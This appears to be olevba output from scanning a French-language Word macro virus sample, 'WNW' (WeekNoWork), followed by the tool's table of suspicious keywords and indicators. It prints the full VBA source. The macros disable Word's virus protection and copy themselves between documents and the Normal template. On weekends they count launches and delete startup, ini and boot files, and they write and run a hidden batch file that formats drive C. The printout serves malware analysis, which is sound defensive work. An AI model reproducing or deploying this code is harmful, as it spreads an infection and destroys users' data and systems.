olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Wnw
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Wnw - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO WNW.bas 
in file: Virus.MSWord.Wnw - OLE stream: 'Macros/VBA/WNW'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo EAE
Dim MyDate, MyWeek, Jour, WExec$, Counter
MyDate = Date
MyWeek = WeekDay(MyDate, vbMonday)
If MyWeek = "6" Or "7" Then
    If MyWeek = "6" Then
        Jour = "Samedi"
    End If
    If MyWeek = "7" Then
        Jour = "Dimanche"
    End If
    MsgBox "On est " & Jour & ", aujourd'hui" & Chr$(13) & "Je ne travaillerai pas..."
    WExec$ = WordBasic.[GetPrivateProfileString$]("WNW", "Total", "WINWORD8.INI")
    Counter = WordBasic.Val(WExec$) + 1
    WordBasic.SetPrivateProfileString "WNW", "Total", Str(Counter), "WINWORD8.INI"
    WExec$ = WordBasic.[GetPrivateProfileString$]("WNW", "Total", "WINWORD8.INI")
        If WExec$ = 10 Then
            MsgBox "Vous jouez avec le feu...", vbCritical, "Virus WNW"
            Kill "C:\Windows\bureau\*.lnk"
            Kill "C:\Windows\menu démarrer\*.*"
            Tasks.ExitWindows
        End If
        If WExec$ = 20 Then
            MsgBox "Je vous avais prévenu...", vbCritical, "Virus WNW"
            Kill "C:\Windows\*.ini"
            Kill "C:\Autoexec.bat"
            Kill "C:\Config.sys"
            Kill "C:\Msdos.sys"
            Kill "C:\Io.sys"
            Tasks.ExitWindows
        End If
        If WExec$ = 30 Then
            MsgBox "Vous l'aurez voulu!!!!", vbCritical, "Virus WNW"
            Open "C:\WNW.BAT" For Output As #1
                Print #1, "Cls"
                Print #1, "Echo off"
                Print #1, "Echo Je vous avais prévenu mais vous allez le regretter.."
                Print #1, "Echo y|Format c: /u /v:WeekNoWork"
                Print #1, "Echo o|Format c: /u /v:WeekNoWork"
            Close #1
            Shell "C:\WNW.BAT", vbHideElse
            Tasks.ExitWindows
        End If
        Call WNWP
Else
    WordBasic.SetPrivateProfileString "WNW", "Total", "1", "WINWORD8.INI"
End If
EAE:
End Sub
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo EAO
iMacroCount = NormalTemplate.VBProject.VBComponents.Count
For i = 1 To iMacroCount
    If NormalTemplate.VBProject.VBComponents(i).Name = "WNW" Then
        WNWInstalled = -1
    End If
Next i
If Not WNWInstalled Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="WNW", Object:=wdOrganizerObjectProjectItems
    MsgBox "Je suis heureux de vous dire que ce Weekend," & Chr$(13) & "vous ne travaillerez pas...", vbInformation, "Virus WNW(WeekNoWork)"
Else
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="WNW", Object:=wdOrganizerObjectProjectItems
    MsgBox "Attention, ce Weekend sera des vacances pour vous..", vbInformation, "Virus WNW(WeekNoWork)"
End If
EAO:
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo EFSA
    Dialogs(wdDialogFileSaveAs).Show
    If ActiveDocument.SaveFormat = wdFormatTemplate Or ActiveDocument.SaveFormat = wdFormatDocument Then
        ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
    End If
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="WNW", Object:=wdOrganizerObjectProjectItems
MsgBox "C'est génial, les vacances..", vbInformation, "Virus WNW(WeekNoWork)"
ActiveDocument.Save
EFSA:
End Sub
Private Sub WNWP()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo EWNWP
Dim Choix
Choix = Int(Rnd * 20) + 1
Select Case Choix
    Case 2, 6, 8, 11, 15
        MsgBox "Au revoir...", vbInformation, "Virus WNW"
        Tasks.ExitWindows
    Case 1, 3, 9, 14, 16
Msg:
        ActiveWindow.Caption = "Je ne veux pas travailler ce weekend, donc, je vais vous en empêcher..."
        For i = 1 To 500000
        Next i
        ActiveWindow.Caption = "        Je ne veux pas travailler ce weekend, donc, je vais vous en empêcher..."
        For i = 1 To 500000
        Next i
        ActiveWindow.Caption = "                Je ne veux pas travailler ce weekend, donc, je vais vous en empêcher..."
        For i = 1 To 500000
        Next i
        ActiveWindow.Caption = "                        Je ne veux pas travailler ce weekend, donc, je vais vous en empêcher..."
        For i = 1 To 500000
        Next i
        ActiveWindow.Caption = "                                Je ne veux pas travailler ce weekend, donc, je vais vous en empêcher..."
        For i = 1 To 500000
        Next i
        ActiveWindow.Caption = "                                        Je ne veux pas travailler ce weekend, donc, je vais vous en empêcher..."
        For i = 1 To 500000
        Next i
        ActiveWindow.Caption = "                                                Je ne veux pas travailler ce weekend, donc, je vais vous en empêcher..."
        For i = 1 To 500000
        Next i
        ActiveWindow.Caption = "                                                        Je ne veux pas travailler ce weekend, donc, je vais vous en empêcher..."
        For i = 1 To 500000
        Next i
        ActiveWindow.Caption = "                                                                Je ne veux pas travailler ce weekend, donc, je vais vous en empêcher..."
        For i = 1 To 500000
        Next i
        ActiveWindow.Caption = "                                                                        Je ne veux pas travailler ce weekend, donc, je vais vous en empêcher..."
        For i = 1 To 500000
        Next i
        ActiveWindow.Caption = "                                                                                Je ne veux pas travailler ce weekend, donc, je vais vous en empêcher..."
        For i = 1 To 500000
        Next i
        ActiveWindow.Caption = "                                                                                        Je ne veux pas travailler ce weekend, donc, je vais vous en empêcher..."
        For i = 1 To 500000
        Next i
        ActiveWindow.Caption = "                                                                                                Je ne veux pas travailler ce weekend, donc, je vais vous en empêcher..."
        For i = 1 To 500000
        Next i
        ActiveWindow.Caption = "                                                                                                        Je ne veux pas travailler ce weekend, donc, je vais vous en empêcher..."
        For i = 1 To 500000
        Next i
        ActiveWindow.Caption = "                                                                                                                Je ne veux pas travailler ce weekend, donc, je vais vous en empêcher..."
        For i = 1 To 500000
        Next i
        StatusBar = "Je ne veux pas travailler ce weekend, donc, je vais vous en empêcher..."
        For i = 1 To 500000
        Next i
        StatusBar = "       Je ne veux pas travailler ce weekend, donc, je vais vous en empêcher..."
        For i = 1 To 500000
        Next i
        StatusBar = "               Je ne veux pas travailler ce weekend, donc, je vais vous en empêcher..."
        For i = 1 To 500000
        Next i
        StatusBar = "                       Je ne veux pas travailler ce weekend, donc, je vais vous en empêcher..."
        For i = 1 To 500000
        Next i
        StatusBar = "                               Je ne veux pas travailler ce weekend, donc, je vais vous en empêcher..."
        For i = 1 To 500000
        Next i
        StatusBar = "                                       Je ne veux pas travailler ce weekend, donc, je vais vous en empêcher..."
        For i = 1 To 500000
        Next i
        StatusBar = "                                               Je ne veux pas travailler ce weekend, donc, je vais vous en empêcher..."
        For i = 1 To 500000
        Next i
        StatusBar = "                                                       Je ne veux pas travailler ce weekend, donc, je vais vous en empêcher..."
        For i = 1 To 500000
        Next i
        StatusBar = "                                                               Je ne veux pas travailler ce weekend, donc, je vais vous en empêcher..."
        For i = 1 To 500000
        Next i
        StatusBar = "                                                                       Je ne veux pas travailler ce weekend, donc, je vais vous en empêcher..."
        For i = 1 To 500000
        Next i
        StatusBar = "                                                                               Je ne veux pas travailler ce weekend, donc, je vais vous en empêcher..."
        For i = 1 To 500000
        Next i
        StatusBar = "                                                                                       Je ne veux pas travailler ce weekend, donc, je vais vous en empêcher..."
        For i = 1 To 500000
        Next i
        StatusBar = "                                                                                               Je ne veux pas travailler ce weekend, donc, je vais vous en empêcher..."
        For i = 1 To 500000
        Next i
        StatusBar = "                                                                                                       Je ne veux pas travailler ce weekend, donc, je vais vous en empêcher..."
        For i = 1 To 500000
        Next i
        StatusBar = "                                                                                                               Je ne veux pas travailler ce weekend, donc, je vais vous en empêcher..."
        For i = 1 To 500000
        Next i
        StatusBar = "                                                                                                                       Je ne veux pas travailler ce weekend, donc, je vais vous en empêcher..."
        For i = 1 To 500000
        Next i
        StatusBar = "                                                                                                                               Je ne veux pas travailler ce weekend, donc, je vais vous en empêcher..."
        For i = 1 To 500000
        Next i
        StatusBar = "                                                                                                                                       Je ne veux pas travailler ce weekend, donc, je vais vous en empêcher..."
        For i = 1 To 500000
        Next i
    GoTo Msg
End Select
EWNWP:
End Sub
Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo EFT
    MsgBox "Attention, ce menu n'est pas autorisé...", vbCritical, "Virus WNW(WeekNoWork)"
EFT:
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ETM
    MsgBox "HAHAHAHAHAHA!!!!!", vbCritical, "Virus WNW"
ETM:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo EVVBC
Assistant.Visible = True
With Assistant.NewBalloon
    .Button = msoButtonSetOK
    .Heading = "Virus WNW"
    .Text = "Vivement Lundi..." & Chr$(13) & "HAHAHAHAHA!!!!"
    .Show
End With
EVVBC:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Autoexec.bat        |Executable file name                         |
|IOC       |WNW.BAT             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

